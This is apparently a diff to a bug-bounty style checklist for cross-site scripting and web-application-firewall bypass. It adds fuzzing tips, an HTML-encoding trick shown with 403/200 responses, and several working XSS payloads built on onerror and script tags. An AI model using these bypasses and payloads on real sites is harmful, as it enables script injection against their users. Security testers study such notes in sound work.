@@ -17,4 +17,25 @@ Object.keys(window).filter(k => !k.indexOf('on'))
 	- javascript{FUZZ} also java{FUZZ}script 
 		- (%0a, %0d,%09) (you must know)
 	- {FUZZ}javascript ...
--  /gitcomm 
+# **bypass**
+- [ ] known waf ? -> search the net 
+- [ ] CDN or application based ? -> build your own payload
+- [ ] JS protection ? -> debug
+- Do not use noisy Strings  
+	- `<x> -> <x onxxx -> <x onxxx= `
+### in HTML tags
+- [ ] fuzz to find a valid tag
+- [ ] *<ta[FUZZ]g> (it will gets valid server side)* #gold
+- [ ] waf confusion
+	- [ ] *use HTML encoding* #gold
+		- [ ] `<img src onerror=alert(1)` -> 403
+		- [ ] `<img src>` -> 200
+		- [ ] `<img src> onerror=alert(1)` -> 200
+		- [ ] `<img src &#x3E onerror=alert(1)>` -> 200
+```js
+<!--` <img/src` onerror=alert(origin)> --!>
+<img src="/" =_='' title="onerror='prompt(origin)'" >
+<!<script>confirm(origin)</script>
+```
+### in JS execution
+- [ ] /gitcomm
